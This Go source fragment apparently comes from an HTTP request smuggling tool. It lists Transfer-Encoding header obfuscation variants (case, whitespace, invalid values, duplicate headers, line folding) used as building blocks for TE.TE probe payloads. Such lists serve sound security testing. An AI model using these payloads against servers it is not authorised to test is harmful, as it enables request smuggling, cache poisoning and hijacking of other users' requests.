package smuggling

// Transfer-Encoding header obfuscation variants. Used to test how
// servers parse TE headers differently — the building blocks the
// TE.TE payloads above are composed from, exposed here so callers
// can build custom probes.
var teObfuscations = []string{
	// Standard variations
	"Transfer-Encoding: chunked",
	"transfer-encoding: chunked",
	"TRANSFER-ENCODING: chunked",
	"Transfer-encoding: chunked",

	// Whitespace variations
	"Transfer-Encoding : chunked",  // Space before colon
	"Transfer-Encoding:  chunked",  // Double space after colon
	"Transfer-Encoding:\tchunked",  // Tab after colon
	"Transfer-Encoding: chunked ",  // Trailing space
	"Transfer-Encoding:chunked",    // No space after colon
	" Transfer-Encoding: chunked",  // Leading space
	"Transfer-Encoding: chunked\t", // Trailing tab

	// Value variations
	"Transfer-Encoding: CHUNKED",      // Uppercase value
	"Transfer-Encoding: ChUnKeD",      // Mixed case value
	"Transfer-Encoding: chunked, cow", // Additional encoding
	"Transfer-Encoding: cow, chunked", // Chunked last
	"Transfer-Encoding: identity",     // Identity encoding

	// Invalid/Obfuscated values
	"Transfer-Encoding: xchunked",    // Invalid prefix
	"Transfer-Encoding: chunkedx",    // Invalid suffix
	"Transfer-Encoding: chunk\x00ed", // Null byte in value
	"Transfer-Encoding: [chunked]",   // Brackets
	"Transfer-Encoding: \"chunked\"", // Quoted

	// HTTP Request Smuggling specific
	"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity", // Double header
	"X-Transfer-Encoding: chunked",                              // Custom header
	"Transfer_Encoding: chunked",                                // Underscore
	"Transfer.Encoding: chunked",                                // Dot

	// Line continuation (obsolete but sometimes supported)
	"Transfer-Encoding: chunked\r\n ", // Obsolete line folding
}
